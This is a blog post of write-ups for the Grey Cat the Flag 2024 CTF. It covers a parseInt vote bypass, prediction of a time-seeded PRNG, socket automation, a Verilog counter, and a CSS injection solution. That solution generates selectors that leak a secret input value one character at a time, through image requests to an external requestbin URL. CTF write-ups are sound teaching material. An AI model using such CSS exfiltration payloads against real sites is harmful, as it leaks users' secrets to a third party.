---
title: "Write-ups for Grey Cat the Flags CTF 2024"
date: 2024-04-21T14:46:00+0800
tags: ["writeups"]
author: "Shang En"
showToc: false
TocOpen: false
draft: false
hidemeta: false
comments: true
description: "I'm rusty..."
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
---

## Greyctf Survey

Refer to: [MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/parseInt)

> In general, it's a bad idea to use parseInt() on non-strings, especially to use it as a substitution for Math.trunc(). It may work on small numbers:
> ```js
> parseInt(15.99, 10); // 15
> parseInt(-15.1, 10); // -15
> ```
> However, it only happens to work because the string representation of these numbers uses basic fractional notation (`"15.99"`, `"-15.1"`), where `parseInt()` stops at the decimal point. Numbers greater than or equal to 1e+21 or less than or equal to 1e-7 use exponential notation (`"1.5e+22"`, `"1.51e-8"`) in their string representation, and `parseInt()` will stop at the `e` character or decimal point, which always comes after the first digit. This means for large and small numbers, `parseInt()` will return a one-digit integer:
> ```js
> parseInt(4.7 * 1e22, 10); // Very large number becomes 4
> parseInt(0.00000000000434, 10); // Very small number becomes 4
> ```


### Relevant Source Code

```js
app.post('/vote', async (req, res) => {
    const {vote} = req.body;
    if(typeof vote != 'number') {
        return res.status(400).json({
            "error": true,
            "msg":"Vote must be a number"
        });
    }
    if(vote < 1 && vote > -1) {
        score += parseInt(vote);
        if(score > 1) {
            score = -0.42069;
            return res.status(200).json({
                "error": false,
                "msg": config.flag,
            });
        }
        return res.status(200).json({
            "error": false,
            "data": score,
            "msg": "Vote submitted successfully"
        });
    } else {
        return res.status(400).json({
            "error": true,
            "msg":"Invalid vote"
        });
    }
})
```

### Solution

`POST` `{"vote": 0.00000000000434}` to `/vote`

## All About Timing

Since the PRNG is seeded with the current time, we just have to seed our PRNG with the current time and connect to the server and call `random.randint`.

```py
import time
import random
import socket

random.seed(int(time.time()))

n = random.randint(1000000000000000, 10000000000000000 - 1)

# Send the number to the client via socket
# nc challs.nusgreyhats.org 31111

HOST = "challs.nusgreyhats.org"
PORT = 31111

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    data = s.recv(1024)
    s.sendall(f"{n}\n".encode())
    data = s.recv(1024)


print("Received", repr(data))
```

## Poly Playground

This challenge is an exercise in socket programming and regular expressions.

### Solution

```py
import socket
import re

HOST = "challs.nusgreyhats.org"
PORT = 31113
PATTERN = "Roots:\s*((?:-?\d+,?\s*)+)"


def polynomial_from_roots(roots):
    # For a single root, the polynomial is (x - root), hence coefficients [1, -root]
    # Coefficients of the resulting polynomial, starting as 1 (for x^0)
    coeffs = [1]

    for root in roots:
        # Current root to process, start with x - root = (1)x + (-root)
        current = [1, -root]
        # Temporary new coefficients, initialized to zero and length of (len(coeffs) + len(current) - 1)
        new_coeffs = [0] * (len(coeffs) + 1)

        # Multiply out the polynomials using the distributive property (convolution)
        for i in range(len(coeffs)):
            for j in range(len(current)):
                new_coeffs[i + j] += coeffs[i] * current[j]

        # Update coeffs to new_coeffs
        coeffs = new_coeffs

    return coeffs


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    data = s.recv(4096)
    data = data.decode().strip()
    match = re.search(PATTERN, data)
    roots = [int(match.group(1))]
    print("Roots:", roots)
    results = polynomial_from_roots(roots)
    results = [str(result) for result in results]
    print("Results:", ",".join(results))
    s.sendall(str(",".join(results)).encode())
    s.sendall(b"\n")

    while True:
        data = s.recv(4096)
        print(data.decode())
        data = data.decode().strip()
        match = re.search(PATTERN, data)
        roots = str(match.group(1)).split(",")
        roots = [int(root) for root in roots]
        print("Roots:", roots)
        results = polynomial_from_roots(roots)
        results = [str(result) for result in results]
        print("Results:", ",".join(results))
        s.sendall(str(",".join(results)).encode())
        s.sendall(b"\n")
```

## Beautiful Styles

Classic [CSS Injection Attack](https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection).

### Solution

```py
# Digits, uppercase letters
# As given in the challenge description
CHARSET = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZf"

output = ""

for c in CHARSET:
    text = f"""
input[id=flag][value^="grey{{X5S34RCH1fY0UC4NF1ND1T{c}"]{{ # Update this as you find each char through the requestbin
    background-image: url(https://en9qepifcn9k.x.pipedream.net/{c});
}}
    """

    output += text

with open("output.txt", "w") as f:
    f.write(output)
```

## Verilog Count

We are asked to write a Verilog program for the Icarus Verilog simulator. We are not allowed to use conditionals (`if`, `else`) and addition (`+`) or ternary operators (`?`).

But we are allowed to use the subtraction (`-`) operator.

The predefined testbench setup requires us to have an input clock `clk` and output 32 bits.

### Solution

```verilog
module counter(
    input clk,
    output reg [31:0] result
);

    reg [31:0] next_count;

    initial begin
        result = 32'd0;
    end

    always @(posedge clk) begin
        result <= result - (-1);
    end

endmodule
```
